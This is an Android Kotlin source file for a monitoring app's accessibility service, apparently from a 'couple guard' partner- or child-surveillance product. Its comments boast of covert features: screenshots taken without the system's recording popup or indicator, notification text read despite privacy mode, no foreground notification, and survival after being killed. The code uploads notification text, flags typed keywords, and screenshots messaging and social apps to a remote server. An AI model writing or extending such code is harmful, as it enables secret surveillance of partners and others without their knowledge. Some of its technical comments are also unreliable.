package com.example.couple_guard_child.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.WindowManager
import com.example.couple_guard_child.utils.ApiClient
import com.example.couple_guard_child.NativeBridge
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

/**
 * ✨ ACCESSIBILITY SERVICE - MOST POWERFUL MONITORING TOOL
 * 
 * Capabilities:
 * 1. Monitor ALL app activities in real-time
 * 2. Capture screenshots (Android 9+) WITHOUT MediaProjection popup
 * 3. Read notification contents EVEN when privacy mode is active
 * 4. Detect keyboard input, UI changes, window changes
 * 5. Run 24/7 in background WITHOUT foreground notification
 * 6. Survive app kill, task removal, and doze mode
 */
class MonitoringAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MonitoringAccessibility"
        private var instance: MonitoringAccessibilityService? = null
        
        fun isRunning(): Boolean = instance != null
        
        fun getInstance(): MonitoringAccessibilityService? = instance
    }

    private val handler = Handler(Looper.getMainLooper())
    private var lastScreenshotTime = 0L
    private val screenshotCooldown = 30000L // 30 seconds between screenshots

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.d(TAG, "========================================")
        Log.d(TAG, "✅ ACCESSIBILITY SERVICE CREATED")
        Log.d(TAG, "This is THE MOST POWERFUL monitoring service")
        Log.d(TAG, "========================================")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        
        Log.d(TAG, "========================================")
        Log.d(TAG, "🔗 ACCESSIBILITY SERVICE CONNECTED")
        Log.d(TAG, "Configuring service capabilities...")
        
        // ✅ Configure service to monitor EVERYTHING
        val info = AccessibilityServiceInfo().apply {
            // Monitor ALL event types
            eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_CLICKED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            
            // Monitor ALL apps
            packageNames = null // null = monitor all packages
            
            // Get detailed information
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            
            // Fast response
            notificationTimeout = 100
            
            // ✅ CRITICAL: Request ALL capabilities
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                   AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                   AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            
            // Android 11+ screenshot capability
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                flags = flags or AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE
            }
        }
        
        serviceInfo = info
        
        Log.d(TAG, "✅ Service configured successfully")
        Log.d(TAG, "Monitoring: ALL apps, ALL events")
        Log.d(TAG, "========================================")
        
        // Start periodic monitoring
        startPeriodicMonitoring()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        // Check if device is paired
        if (!ApiClient.isPaired(applicationContext)) {
            return
        }

        when (event.eventType) {
            // ✅ Capture notification content BEFORE Android hides it
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                handleNotification(event)
            }
            
            // ✅ Detect app switches
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleWindowChange(event)
            }
            
            // ✅ Detect user typing (for keyword detection)
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleTextChange(event)
            }
        }
    }

    private fun handleNotification(event: AccessibilityEvent) {
        try {
            Log.d(TAG, "📱 Notification detected via Accessibility")
            
            // ✅ Extract notification content DIRECTLY from accessibility event
            val packageName = event.packageName?.toString() ?: ""
            val text = event.text?.joinToString(" ") ?: ""
            val parcelable = event.parcelableData
            
            Log.d(TAG, "Package: $packageName")
            Log.d(TAG, "Text: $text")
            
            if (text.isNotEmpty()) {
                // Send to server immediately
                Thread {
                    try {
                        ApiClient.sendNotification(
                            applicationContext,
                            packageName,
                            "Notification",
                            text
                        )
                        Log.d(TAG, "✅ Notification sent via Accessibility")
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to send notification", e)
                    }
                }.start()
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling notification", e)
        }
    }

    private fun handleWindowChange(event: AccessibilityEvent) {
        try {
            val packageName = event.packageName?.toString() ?: return
            val className = event.className?.toString() ?: return
            
            Log.d(TAG, "📱 App switch detected: $packageName")
            
            // ✅ Check if this is a "sensitive" app that needs monitoring
            if (isSensitiveApp(packageName)) {
                Log.d(TAG, "⚠️ SENSITIVE APP DETECTED: $packageName")
                
                // Take screenshot after delay (let app fully load)
                handler.postDelayed({
                    takeScreenshotViaAccessibility()
                }, 2000)
                
                // Optionally trigger camera capture
                // triggerCameraCapture()
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling window change", e)
        }
    }

    private fun handleTextChange(event: AccessibilityEvent) {
        try {
            val text = event.text?.joinToString(" ") ?: return
            
            // ✅ Keyword detection (example: detect bad words, URLs, etc.)
            if (containsSensitiveKeyword(text)) {
                Log.w(TAG, "⚠️ SENSITIVE KEYWORD DETECTED")
                
                // Take screenshot of what user is typing
                takeScreenshotViaAccessibility()
                
                // Alert parent (via FCM or API)
                alertParent("Sensitive keyword detected: ${text.take(50)}")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling text change", e)
        }
    }

    /**
     * ✅ SCREENSHOT via Accessibility API (Android 9+)
     * NO MediaProjection popup needed!
     * NO "Screen recording" indicator!
     */
    private fun takeScreenshotViaAccessibility() {
        // Cooldown check
        val now = System.currentTimeMillis()
        if (now - lastScreenshotTime < screenshotCooldown) {
            Log.d(TAG, "Screenshot on cooldown, skipping")
            return
        }
        lastScreenshotTime = now
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // ✅ Android 11+ has direct screenshot API
            Log.d(TAG, "📸 Taking screenshot via Accessibility API...")
            
            try {
                takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    applicationContext.mainExecutor,
                    object : TakeScreenshotCallback {
                        override fun onSuccess(result: ScreenshotResult) {
                            Log.d(TAG, "✅ Screenshot captured successfully")
                            
                            try {
                                // Convert to Bitmap
                                val hardwareBuffer = result.hardwareBuffer
                                val bitmap = Bitmap.wrapHardwareBuffer(
                                    hardwareBuffer,
                                    result.colorSpace
                                )
                                
                                if (bitmap != null) {
                                    // Save and upload
                                    saveAndUploadScreenshot(bitmap)
                                    bitmap.recycle()
                                } else {
                                    Log.e(TAG, "Failed to create bitmap from hardware buffer")
                                }
                                
                                hardwareBuffer.close()
                                
                            } catch (e: Exception) {
                                Log.e(TAG, "Error processing screenshot", e)
                            }
                        }
                        
                        override fun onFailure(errorCode: Int) {
                            Log.e(TAG, "❌ Screenshot failed with code: $errorCode")
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "Exception taking screenshot", e)
            }
        } else {
            // ✅ Android 9-10: Fallback to MediaProjection
            // (Still requires one-time permission, but can be stored)
            Log.d(TAG, "Android < 11, using MediaProjection fallback")
            // You can implement this if needed
        }
    }

    private fun saveAndUploadScreenshot(bitmap: Bitmap) {
        Thread {
            try {
                // Save to file
                val dir = File(applicationContext.cacheDir, "screenshots")
                if (!dir.exists()) dir.mkdirs()
                
                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val file = File(dir, "screenshot_$timestamp.jpg")
                
                FileOutputStream(file).use { out ->
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, out)
                }
                
                Log.d(TAG, "✅ Screenshot saved: ${file.absolutePath}")
                Log.d(TAG, "File size: ${file.length() / 1024} KB")
                
                // Upload to server
                val deviceId = NativeBridge.getDeviceId(applicationContext) ?: return@Thread
                
                val success = ApiClient.uploadScreenshot(applicationContext, file)
                
                if (success) {
                    Log.d(TAG, "✅ Screenshot uploaded successfully")
                    file.delete()
                } else {
                    Log.e(TAG, "❌ Failed to upload screenshot")
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Error saving/uploading screenshot", e)
            }
        }.start()
    }

    private fun isSensitiveApp(packageName: String): Boolean {
        // ✅ Define sensitive apps that need monitoring
        val sensitiveApps = listOf(
            "com.android.chrome",
            "com.instagram.android",
            "com.tiktok",
            "com.whatsapp",
            "com.telegram",
            "com.snapchat.android",
            "com.facebook.katana",
            "com.twitter.android"
        )
        
        return sensitiveApps.any { packageName.contains(it, ignoreCase = true) }
    }

    private fun containsSensitiveKeyword(text: String): Boolean {
        // ✅ Example sensitive keywords
        val keywords = listOf(
            "porn", "sex", "drug", "suicide", "violence"
            // Add more based on your requirements
        )
        
        return keywords.any { text.contains(it, ignoreCase = true) }
    }

    private fun alertParent(message: String) {
        Thread {
            try {
                // Send alert to parent via API
                Log.d(TAG, "🚨 ALERT: $message")
                // Implement your alert mechanism here
            } catch (e: Exception) {
                Log.e(TAG, "Failed to alert parent", e)
            }
        }.start()
    }

    private fun startPeriodicMonitoring() {
        // ✅ Periodic screenshot (every 30 minutes for example)
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (ApiClient.isPaired(applicationContext)) {
                    Log.d(TAG, "⏰ Periodic monitoring check")
                    // Optionally take periodic screenshot
                    // takeScreenshotViaAccessibility()
                }
                
                // Schedule next check
                handler.postDelayed(this, 30 * 60 * 1000) // 30 minutes
            }
        }, 30 * 60 * 1000)
    }

    override fun onInterrupt() {
        Log.w(TAG, "⚠️ Accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        Log.d(TAG, "❌ Accessibility service destroyed")
    }
}